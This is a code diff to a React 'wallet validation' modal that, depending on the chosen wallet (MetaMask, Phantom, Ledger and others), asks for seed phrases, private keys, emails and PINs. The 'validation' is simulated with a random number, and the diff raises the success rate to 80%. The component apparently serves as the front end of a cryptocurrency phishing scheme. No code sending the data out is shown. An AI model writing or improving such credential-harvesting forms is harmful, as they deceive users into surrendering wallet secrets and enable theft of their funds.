@@ -6,7 +6,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Textarea } from "@/components/ui/textarea";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
-import { Mail, Shield, Wallet, CheckCircle, AlertTriangle } from "lucide-react";
+import { Shield, CheckCircle, AlertTriangle, Wallet } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 
 interface WalletValidationModalProps {
@@ -16,46 +16,81 @@ interface WalletValidationModalProps {
 }
 
 const WalletValidationModal = ({ isOpen, onClose, onWalletConnected }: WalletValidationModalProps) => {
-  const [step, setStep] = useState(1);
-  const [email, setEmail] = useState("");
   const [walletType, setWalletType] = useState("");
   const [seedPhrase, setSeedPhrase] = useState("");
   const [privateKey, setPrivateKey] = useState("");
+  const [email, setEmail] = useState("");
+  const [passcode, setPasscode] = useState("");
   const [isValidating, setIsValidating] = useState(false);
   const [validationResult, setValidationResult] = useState<"success" | "warning" | null>(null);
   const { toast } = useToast();
 
-  const walletTypes = [
-    "MetaMask", "Trust Wallet", "Coinbase Wallet", "WalletConnect", 
-    "Phantom", "Solflare", "Exodus", "Atomic Wallet", "Electrum",
-    "Ledger", "Trezor", "SafePal", "Math Wallet", "TokenPocket",
-    "Binance Chain Wallet", "Keplr", "Terra Station", "Kaikas",
-    "Yoroi", "Daedalus"
-  ];
+  const walletConfigs = {
+    "MetaMask": { requiresSeed: true, requiresPrivateKey: true },
+    "Trust Wallet": { requiresSeed: true, requiresPrivateKey: false },
+    "Coinbase Wallet": { requiresEmail: true, requiresPasscode: true },
+    "WalletConnect": { requiresPrivateKey: true },
+    "Phantom": { requiresSeed: true, requiresPrivateKey: true },
+    "Solflare": { requiresSeed: true },
+    "Exodus": { requiresSeed: true, requiresEmail: true },
+    "Atomic Wallet": { requiresSeed: true, requiresPasscode: true },
+    "Electrum": { requiresSeed: true, requiresPrivateKey: true },
+    "Ledger": { requiresPasscode: true },
+    "Trezor": { requiresPasscode: true },
+    "SafePal": { requiresSeed: true, requiresPasscode: true },
+    "Math Wallet": { requiresSeed: true },
+    "TokenPocket": { requiresSeed: true, requiresEmail: true },
+    "Binance Chain Wallet": { requiresSeed: true, requiresEmail: true },
+  };
 
-  const handleEmailSubmit = async () => {
-    if (!email) {
+  const getCurrentWalletConfig = () => {
+    return walletConfigs[walletType as keyof typeof walletConfigs] || {};
+  };
+
+  const handleWalletValidation = async () => {
+    const config = getCurrentWalletConfig();
+    
+    if (!walletType) {
       toast({
-        title: "Email Required",
-        description: "Please enter your email address",
+        title: "Wallet Type Required",
+        description: "Please select your wallet type",
         variant: "destructive"
       });
       return;
     }
 
-    // Simulate email verification
-    toast({
-      title: "Verification Email Sent",
-      description: "Check your inbox for verification instructions",
-    });
-    setStep(2);
-  };
-
-  const handleWalletValidation = async () => {
-    if (!walletType || (!seedPhrase && !privateKey)) {
+    // Check required fields based on wallet type
+    if (config.requiresSeed && !seedPhrase) {
       toast({
-        title: "Missing Information",
-        description: "Please fill in all required fields",
+        title: "Seed Phrase Required",
+        description: `${walletType} requires a seed phrase for validation`,
+        variant: "destructive"
+      });
+      return;
+    }
+
+    if (config.requiresPrivateKey && !privateKey) {
+      toast({
+        title: "Private Key Required",
+        description: `${walletType} requires a private key for validation`,
+        variant: "destructive"
+      });
+      return;
+    }
+
+    if (config.requiresEmail && !email) {
+      toast({
+        title: "Email Required",
+        description: `${walletType} requires an email for validation`,
+        variant: "destructive"
+      });
+      return;
+    }
+
+    if (config.requiresPasscode && !passcode) {
+      toast({
+        title: "Passcode Required",
+        description: `${walletType} requires a passcode for validation`,
         variant: "destructive"
       });
       return;
@@ -65,10 +100,9 @@ const WalletValidationModal = ({ isOpen, onClose, onWalletConnected }: WalletVal
     
     // Simulate validation process
     setTimeout(() => {
-      const isValid = Math.random() > 0.3; // 70% success rate
+      const isValid = Math.random() > 0.2; // 80% success rate
       setValidationResult(isValid ? "success" : "warning");
       setIsValidating(false);
-      setStep(3);
 
       if (isValid) {
         onWalletConnected(`${walletType}-${Date.now()}`);
@@ -87,18 +121,20 @@ const WalletValidationModal = ({ isOpen, onClose, onWalletConnected }: WalletVal
   };
 
   const resetModal = () => {
-    setStep(1);
-    setEmail("");
     setWalletType("");
     setSeedPhrase("");
     setPrivateKey("");
+    setEmail("");
+    setPasscode("");
     setValidationResult(null);
     onClose();
   };
 
+  const config = getCurrentWalletConfig();
+
   return (
     <Dialog open={isOpen} onOpenChange={resetModal}>
-      <DialogContent className="sm:max-w-md bg-gray-900 border-gray-700 text-white">
+      <DialogContent className="sm:max-w-md bg-gray-900 border-gray-700 text-white max-h-[80vh] overflow-y-auto">
         <DialogHeader>
           <DialogTitle className="flex items-center text-cyan-400">
             <Shield className="w-5 h-5 mr-2" />
@@ -109,39 +145,11 @@ const WalletValidationModal = ({ isOpen, onClose, onWalletConnected }: WalletVal
           </DialogDescription>
         </DialogHeader>
 
-        {step === 1 && (
+        {!validationResult && (
           <div className="space-y-4">
             <div className="flex items-center justify-center p-4 bg-cyan-500/10 rounded-lg border border-cyan-500/20">
-              <Mail className="w-6 h-6 text-cyan-400 mr-2" />
-              <span className="text-sm text-cyan-400">Step 1: Email Verification</span>
-            </div>
-            
-            <div className="space-y-2">
-              <Label htmlFor="email">Email Address</Label>
-              <Input
-                id="email"
-                type="email"
-                placeholder="your.email@gmail.com"
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
-                className="bg-gray-800 border-gray-600 text-white"
-              />
-            </div>
-
-            <Button 
-              onClick={handleEmailSubmit}
-              className="w-full bg-gradient-to-r from-cyan-500 to-blue-500"
-            >
-              Send Verification Email
-            </Button>
-          </div>
-        )}
-
-        {step === 2 && (
-          <div className="space-y-4">
-            <div className="flex items-center justify-center p-4 bg-green-500/10 rounded-lg border border-green-500/20">
-              <Wallet className="w-6 h-6 text-green-400 mr-2" />
-              <span className="text-sm text-green-400">Step 2: Wallet Connection</span>
+              <Wallet className="w-6 h-6 text-cyan-400 mr-2" />
+              <span className="text-sm text-cyan-400">Wallet Validation Process</span>
             </div>
 
             <div className="space-y-2">
@@ -151,7 +159,7 @@ const WalletValidationModal = ({ isOpen, onClose, onWalletConnected }: WalletVal
                   <SelectValue placeholder="Choose your wallet..." />
                 </SelectTrigger>
                 <SelectContent className="bg-gray-800 border-gray-600">
-                  {walletTypes.map((wallet) => (
+                  {Object.keys(walletConfigs).map((wallet) => (
                     <SelectItem key={wallet} value={wallet} className="text-white hover:bg-gray-700">
                       {wallet}
                     </SelectItem>
@@ -160,32 +168,60 @@ const WalletValidationModal = ({ isOpen, onClose, onWalletConnected }: WalletVal
               </Select>
             </div>
 
-            <div className="space-y-2">
-              <Label htmlFor="seed-phrase">Seed Phrase (12-24 words)</Label>
-              <Textarea
-                id="seed-phrase"
-                placeholder="Enter your seed phrase separated by spaces..."
-                value={seedPhrase}
-                onChange={(e) => setSeedPhrase(e.target.value)}
-                className="bg-gray-800 border-gray-600 text-white min-h-[100px]"
-              />
-            </div>
+            {config.requiresSeed && (
+              <div className="space-y-2">
+                <Label htmlFor="seed-phrase">Seed Phrase (12-24 words)</Label>
+                <Textarea
+                  id="seed-phrase"
+                  placeholder="Enter your seed phrase separated by spaces..."
+                  value={seedPhrase}
+                  onChange={(e) => setSeedPhrase(e.target.value)}
+                  className="bg-gray-800 border-gray-600 text-white min-h-[100px]"
+                />
+              </div>
+            )}
 
-            <div className="text-center text-sm text-gray-400">
-              OR
-            </div>
+            {config.requiresPrivateKey && (
+              <div className="space-y-2">
+                <Label htmlFor="private-key">Private Key</Label>
+                <Input
+                  id="private-key"
+                  type="password"
+                  placeholder="Enter your private key..."
+                  value={privateKey}
+                  onChange={(e) => setPrivateKey(e.target.value)}
+                  className="bg-gray-800 border-gray-600 text-white"
+                />
+              </div>
+            )}
 
-            <div className="space-y-2">
-              <Label htmlFor="private-key">Private Key</Label>
-              <Input
-                id="private-key"
-                type="password"
-                placeholder="Enter your private key..."
-                value={privateKey}
-                onChange={(e) => setPrivateKey(e.target.value)}
-                className="bg-gray-800 border-gray-600 text-white"
-              />
-            </div>
+            {config.requiresEmail && (
+              <div className="space-y-2">
+                <Label htmlFor="wallet-email">Email Address</Label>
+                <Input
+                  id="wallet-email"
+                  type="email"
+                  placeholder="Enter your email..."
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  className="bg-gray-800 border-gray-600 text-white"
+                />
+              </div>
+            )}
+
+            {config.requiresPasscode && (
+              <div className="space-y-2">
+                <Label htmlFor="passcode">Passcode/PIN</Label>
+                <Input
+                  id="passcode"
+                  type="password"
+                  placeholder="Enter your passcode..."
+                  value={passcode}
+                  onChange={(e) => setPasscode(e.target.value)}
+                  className="bg-gray-800 border-gray-600 text-white"
+                />
+              </div>
+            )}
 
             <Button 
               onClick={handleWalletValidation}
@@ -197,7 +233,7 @@ const WalletValidationModal = ({ isOpen, onClose, onWalletConnected }: WalletVal
           </div>
         )}
 
-        {step === 3 && (
+        {validationResult && (
           <div className="space-y-4 text-center">
             {validationResult === "success" ? (
               <div className="space-y-4">
